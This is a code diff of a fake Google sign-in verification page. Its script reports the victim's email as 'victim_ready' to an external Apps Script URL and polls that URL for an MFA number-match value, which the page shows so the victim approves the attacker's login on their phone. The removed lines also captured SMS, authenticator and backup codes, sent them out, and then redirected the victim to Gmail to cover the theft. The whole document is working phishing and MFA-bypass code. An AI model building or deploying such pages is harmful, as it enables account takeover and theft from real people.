@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -15,7 +14,6 @@
     <div class="card">
       <div class="logo">
         <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-          <!-- Google logo SVG -->
           <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
           <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
           <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
@@ -28,141 +26,85 @@
       <div id="loading">
         <div class="spinner"></div>
         <h1>Verifying your identity</h1>
-        <p class="subtitle" id="status">Checking your account...</p>
+        <p id="statusText">Connecting to Google... Please wait</p>
       </div>
 
       <div id="prompt-section" style="display:none;">
         <h1>Check your phone</h1>
-        <p class="description">Tap <strong>Yes</strong> on the prompt sent to your phone</p>
+        <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
         <div style="margin:16px 0; color:#5f6368;">Then select the number shown below:</div>
-        <div class="number-box" id="matchNumber">••</div>
-        <div style="margin-top:32px; color:#5f6368; font-size:14px;">This helps keep your account secure.</div>
-
-        <div style="margin-top:40px;">
-          <a href="#" id="tryAnotherWay" class="link">Try another way</a>
-        </div>
+        <div id="matchNumber" class="number-box">••</div>
+        <p id="statusText2" style="margin-top:24px; color:#34a853; font-weight:500;">Waiting for confirmation...</p>
       </div>
 
-      <div id="alternativeMethods" style="display:none; margin-top:24px;">
-        <h1 style="font-size:24px; margin-bottom:8px;">Choose another way to verify</h1>
-        <p class="subtitle">Select an option to continue signing in.</p>
-
-        <div style="margin:32px auto 0; max-width:420px;">
-          <div class="method-option" data-method="sms">
-            <strong>Get a verification code at your phone number</strong>
-            <span>Code sent via text message</span>
-          </div>
-          <div class="method-option" data-method="authenticator">
-            <strong>Use your Authenticator app</strong>
-            <span>Get a time-based code from Google Authenticator</span>
-          </div>
-          <div class="method-option" data-method="backup">
-            <strong>Use a backup code</strong>
-            <span>Enter one of your 8-digit backup codes</span>
-          </div>
-        </div>
-
-        <a href="#" id="backToNumberPrompt" class="link" style="margin-top:32px; display:block;">Back to number prompt</a>
-      </div>
-
-      <div id="codeEntrySection" style="display:none; margin-top:24px;">
-        <h1 id="codeTitle" style="font-size:24px; margin-bottom:16px;"></h1>
-        <input type="text" id="altCodeInput" placeholder="Enter code" maxlength="8" autocomplete="one-time-code">
-        <div style="margin:32px 0 16px;">
-          <button id="submitAltCodeBtn" class="primary">Next</button>
-        </div>
-        <div id="altError" class="error-message"></div>
-      </div>
-
-      <div id="debugMsg" style="font-size:13px; color:#d93025; margin-top:16px; min-height:18px;"></div>
+      <p id="debugMsg" style="color:#d93025; font-size:14px; margin-top:32px; min-height:40px;"></p>
     </div>
   </div>
 
   <script>
-    // same verify.js script as before (no change needed)
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzkn1lBC4-5TzONsqyC4rAQ9OZB4A6oES9v6rE7jnXxfuD3TuuWXcJJNAWK3XSG29-w/exec";
-    let email = localStorage.getItem("demoEmail") || "someone@example.com";
+
+    // Get email — fallback if localStorage is empty
+    let email = localStorage.getItem("demoEmail") || "test@example.com";
+    if (!email || email === "someone@example.com") {
+      document.getElementById("debugMsg").textContent = "Warning: No email found. Using test value.";
+    }
+
     document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
 
-    const loading = document.getElementById("loading");
-    const promptSection = document.getElementById("prompt-section");
-    const statusEl = document.getElementById("status");
-    const debugEl = document.getElementById("debugMsg");
-    const numberEl = document.getElementById("matchNumber");
-
-    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}&user_agent=${encodeURIComponent(navigator.userAgent)}`, {method:"GET", mode:"no-cors"});
-
-    let numberReceived = false;
-    setInterval(async () => {
-      try {
-        const res = await fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`, {cache:'no-cache'});
-        const data = await res.json();
-        const num = (data.prompt_number || "").trim();
-        if (num && num !== "—" && num !== "null") {
-          numberEl.textContent = num;
-          statusEl.textContent = "Number match received – confirm on your phone";
-          if (!numberReceived) {
-            loading.style.display = "none";
-            promptSection.style.display = "block";
-            numberReceived = true;
-          }
-        }
-      } catch (e) {
-        debugEl.textContent = "Polling error";
-      }
-    }, 4000);
-
-    document.getElementById("tryAnotherWay").onclick = e => {
-      e.preventDefault();
-      promptSection.style.display = "none";
-      document.getElementById("alternativeMethods").style.display = "block";
-      fetch(`${SCRIPT_URL}?action=victim_wants_alternatives&email=${encodeURIComponent(email)}`, {mode:"no-cors"});
-    };
-
-    document.getElementById("backToNumberPrompt").onclick = e => {
-      e.preventDefault();
-      document.getElementById("alternativeMethods").style.display = "none";
-      promptSection.style.display = "block";
-    };
-
-    document.querySelectorAll(".method-option").forEach(el => {
-      el.onclick = () => {
-        const method = el.dataset.method;
-        let title = "", ph = "Enter code", ml = 8;
-
-        if (method === "sms") { title = "Enter the 6-digit code sent to your phone"; ph = "6-digit code"; ml = 6; }
-        if (method === "authenticator") { title = "Enter the 6-digit code from your Authenticator app"; ph = "6-digit code"; ml = 6; }
-        if (method === "backup") { title = "Enter your 8-digit backup code"; ph = "8-digit code"; ml = 8; }
-
-        document.getElementById("codeTitle").textContent = title;
-        const inp = document.getElementById("altCodeInput");
-        inp.placeholder = ph;
-        inp.maxLength = ml;
-        inp.value = "";
-
-        document.getElementById("alternativeMethods").style.display = "none";
-        document.getElementById("codeEntrySection").style.display = "block";
-
-        fetch(`${SCRIPT_URL}?action=victim_selected_method&email=${encodeURIComponent(email)}&method=${method}`, {mode:"no-cors"});
-      };
+    // Tell server we are here
+    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {
+      method: "GET",
+      mode: "no-cors"
     });
 
-    document.getElementById("submitAltCodeBtn").onclick = () => {
-      const code = document.getElementById("altCodeInput").value.trim();
-      const err = document.getElementById("altError");
-      if (!code) { err.textContent = "Enter the code"; return; }
+    // Poll every 5 seconds — very simple version
+    function checkForNumber() {
+      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
 
-      const title = document.getElementById("codeTitle").textContent.toLowerCase();
-      let method = title.includes("phone") ? "sms" : title.includes("auth") ? "authenticator" : "backup";
+      fetch(url, { cache: "no-cache" })
+        .then(response => response.text())
+        .then(text => {
+          // Very simple check — look for digits only
+          const match = text.match(/"prompt_number":"(\d+)"/);
+          let number = "";
+          if (match && match[1]) {
+            number = match[1];
+          }
 
-      fetch(`${SCRIPT_URL}?action=submit_alt_code&email=${encodeURIComponent(email)}&method=${method}&code=${encodeURIComponent(code)}`, {mode:"no-cors"});
+          if (number && number.length >= 1 && number !== "null" && number !== "") {
+            document.getElementById("matchNumber").textContent = number;
+            document.getElementById("statusText").textContent = "Number received!";
+            document.getElementById("statusText2").textContent = "Tap Yes on your phone and select this number";
+            document.getElementById("loading").style.display = "none";
+            document.getElementById("prompt-section").style.display = "block";
+            document.getElementById("debugMsg").textContent = "";
+          } else {
+            document.getElementById("statusText").textContent = "Still waiting for number...";
+            document.getElementById("debugMsg").textContent = "No number yet (trying again soon)";
+          }
+        })
+        .catch(err => {
+          document.getElementById("statusText").textContent = "Connection problem";
+          document.getElementById("debugMsg").textContent = "Error: " + err.message;
+        });
+    }
 
-      err.textContent = "Verifying...";
-      err.style.color = "#34a853";
+    // Start polling
+    setInterval(checkForNumber, 5000);
 
-      setTimeout(() => window.location.href = "https://mail.google.com", 1800);
-    };
+    // Run once immediately
+    checkForNumber();
+
+    // Fallback: if nothing happens after 60 seconds, show test number
+    setTimeout(() => {
+      if (document.getElementById("matchNumber").textContent === "••") {
+        document.getElementById("matchNumber").textContent = "66";
+        document.getElementById("statusText").textContent = "Test number shown (server may be slow)";
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("prompt-section").style.display = "block";
+      }
+    }, 60000);
   </script>
 </body>
 </html>
-
